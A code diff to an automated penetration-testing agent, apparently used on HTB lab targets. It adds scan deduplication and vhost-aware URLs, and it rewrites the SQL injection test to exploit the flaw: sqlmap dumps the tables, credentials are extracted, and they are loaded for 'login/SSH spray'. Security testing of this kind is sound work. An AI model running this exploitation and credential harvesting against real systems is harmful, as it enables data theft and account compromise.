@@ -51,6 +51,18 @@ class WebAgent(BaseAgent):
     Runs tests in parallel where possible for speed.
     """
 
+    # ── Re-dispatch dedup ────────────────────────────────────────────────
+    # The full battery (nikto + nuclei + sqlmap + the 15-path auth-bypass curl
+    # sweep + …) is a heavy, fixed "comprehensive assessment".  A fresh
+    # WebAgent is created on every re-dispatch (finding triggers, pivots,
+    # reasoning loop), so an instance flag would not persist — the result was
+    # the same target getting curl-flooded 200+ times across one engagement
+    # while the loop spun.  This class-level registry, keyed by session id,
+    # records which "target:port" already had the full battery run so a
+    # re-dispatch is a no-op instead of a re-flood.  New evidence (params,
+    # paths) is followed up by the decision-engine primer ladder separately.
+    _BATTERY_DONE: Dict[str, set] = {}
+
     def __init__(self, broadcast: Optional[BroadcastFn] = None):
         super().__init__(AgentName.OSINT, broadcast)   # reuse OSINT enum slot
         self.name  = "web"
@@ -100,9 +112,43 @@ class WebAgent(BaseAgent):
 
         await self.set_status(AgentStatus.RUNNING, f"Web application testing: {target}")
 
+        # Re-dispatch dedup — see WebAgent._BATTERY_DONE.  Skip ports whose
+        # full battery already ran this engagement so we never re-flood.
+        done_key = self._session_id or session_id or "default"
+        done     = WebAgent._BATTERY_DONE.setdefault(done_key, set())
+
         for port in web_ports[:4]:  # test up to 4 web ports
             proto    = "https" if port in _HTTPS_PORTS else "http"
-            base_url = f"{proto}://{target}:{port}"
+            # Vhost-aware base URL via the central target resolver: when the
+            # target redirects to a vhost (e.g. cctv.htb), the ENTIRE battery
+            # (_test_auth_bypass curls, nikto, webdav, …) now hits the real app
+            # instead of the bare IP that just 302-redirects.  `target` (the IP)
+            # is still used for finding attribution + network probes (sslscan).
+            try:
+                from agents.recon import target_resolver as _tr
+                _whost   = _tr.web_host(intel) or target
+                base_url = _tr.web_base_url(intel, port, scheme=proto)
+            except Exception:
+                _whost   = target
+                base_url = f"{proto}://{target}:{port}"
+
+            # Dedup key = the RESOLVED web host:port (the vhost when known), NOT
+            # the bare IP.  Keying on the IP let a battery that first ran against
+            # the redirecting IP mark "IP:80 done" and SUPPRESS the correct
+            # vhost re-run — so the authoritative deep scan never hit the app.
+            pk = f"{_whost}:{port}"
+            if pk in done:
+                await self.emit_reasoning(
+                    step       = f"web_battery_skip_{port}",
+                    reasoning  = (f"Full web battery already executed against "
+                                  f"{base_url} this engagement — re-dispatch "
+                                  f"would re-flood the target with the identical "
+                                  f"curl/nikto/nuclei/sqlmap sweep."),
+                    decision   = "Skipping redundant re-scan (dedup)",
+                    next_action= "Follow-up on new evidence runs via the primer ladder",
+                )
+                continue
+            done.add(pk)   # mark up-front so a concurrent re-dispatch also skips
 
             tech_info = {
                 "is_windows":   is_windows,
@@ -366,34 +412,77 @@ class WebAgent(BaseAgent):
                 })
 
     async def _test_sqli(self, target, port, proto, base_url, result):
-        """SQL injection with aggressive sqlmap settings."""
-        # Level 5, Risk 3 = thorough testing (all techniques, time-based, stacked queries)
+        """SQL injection — BOUNDED detect+dump, then weaponise (extract creds).
+
+        Fixes from the smarthire.htb post-mortem:
+          • Old args (deep crawl depth 3 + level 5 / risk 3) against root sat in
+            detection for 900s and never dumped. Now depth-1 crawl + level/risk 2
+            + --dump so a real injection is looted in the same bounded run.
+          • Old confirmation matched sqlmap's normal startup "fetched random
+            User-Agent" line and bare 'injectable' (also present in the phrase
+            "might not be injectable") → FAKE CRITICAL on every run. Now a strict
+            confirmation test gates the finding.
+          • A confirmed SQLi was never weaponised. Now we read the dumped tables
+            and load any credentials into result['credentials'] for login/SSH reuse.
+        """
+        from agents.exploit.sqli_weaponize import (
+            sqlmap_confirmed_injection, extract_credentials_from_dump, build_dump_args,
+        )
         sqli = await self.run_tool(
-            "sqlmap",
-            f"-u {base_url}/ --crawl=3 --level=5 --risk=3 --batch --forms --dbs "
-            f"--random-agent --tamper=space2comment "
-            f"--output-dir=/tmp/sqlmap_{port} --flush-session --threads=4",
-            target=target, phase=AttackPhase.VULN_ID, timeout=300
+            "sqlmap", build_dump_args(base_url.rstrip("/") + "/", port, is_form=True),
+            target=target, phase=AttackPhase.VULN_ID, timeout=600
         )
         stdout = sqli["stdout"]
         result["raw_output"] += "\n" + stdout
-        if any(k in stdout.lower() for k in
-               ["injectable", "is vulnerable", "sqlmap identified", "[INFO] fetched"]):
-            result["sqli_found"] = True
-            dbs = re.findall(r"available databases.*?:\n(.*?)(?:\n\n|\Z)", stdout, re.DOTALL)
-            await self.store_finding(
-                severity=FindingSeverity.CRITICAL,
-                title=f"SQL Injection Confirmed: {base_url}",
-                description="SQL injection vulnerability detected. Database contents accessible.\n" +
-                           (f"Databases found: {dbs[0][:200]}" if dbs else ""),
-                host=target, port=port, service="http", tool_used="sqlmap",
-                evidence=stdout[:3000],
-                remediation="Use parameterised queries. Never concatenate user input into SQL."
+        if not sqlmap_confirmed_injection(stdout):
+            return   # no REAL injection — never raise a fabricated CRITICAL
+        result["sqli_found"] = True
+
+        # ── Weaponise: read the dump CSVs sqlmap just wrote (on THIS Kali host —
+        #    a local read of attacker-side tool output) + extract credentials. ──
+        creds: list = []
+        try:
+            dump = await self.run_tool(
+                "bash",
+                ("-c \"find /tmp/sqlmap_%d -path '*/dump/*' -name '*.csv' "
+                 "-exec echo '===ARGUSCSV===' \\; -exec cat {} \\; 2>/dev/null | head -c 200000\""
+                 % port),
+                target=target, phase=AttackPhase.VULN_ID, timeout=30,
             )
-            result["web_vulns"].append({
-                "type": "sqli", "severity": "critical",
-                "url": base_url, "description": "SQL injection confirmed"
-            })
+            files = [f for f in (dump.get("stdout", "") or "").split("===ARGUSCSV===")
+                     if f.strip()]
+            creds = extract_credentials_from_dump(files)
+        except Exception:
+            creds = []
+
+        if creds:
+            result.setdefault("credentials", [])
+            for c in creds:
+                result["credentials"].append({
+                    "username": c["username"],
+                    "password": c["secret"],
+                    "source":   f"sqli_dump:{base_url}",
+                    "hash":     c.get("hash_mode") or None,
+                    "service":  "web/db",
+                })
+
+        _users = sorted({c["username"] for c in creds})[:10]
+        await self.store_finding(
+            severity=FindingSeverity.CRITICAL,
+            title=(f"SQL Injection EXPLOITED — {len(creds)} credential(s) dumped: {base_url}"
+                   if creds else f"SQL Injection Confirmed: {base_url}"),
+            description=("SQL injection confirmed via sqlmap. "
+                         + (f"Dumped {len(creds)} credential(s): {', '.join(_users)}. "
+                            "Loaded into the credential store for login/SSH spray."
+                            if creds else "No credential columns found in dumped tables.")),
+            host=target, port=port, service="http", tool_used="sqlmap",
+            evidence=stdout[:3000],
+            remediation="Use parameterised queries. Never concatenate user input into SQL."
+        )
+        result["web_vulns"].append({
+            "type": "sqli", "severity": "critical", "url": base_url,
+            "description": f"SQL injection confirmed + dumped ({len(creds)} creds)"
+        })
 
     async def _test_command_injection(self, target, port, proto, base_url, result):
         """OS command injection via commix — aggressive mode."""
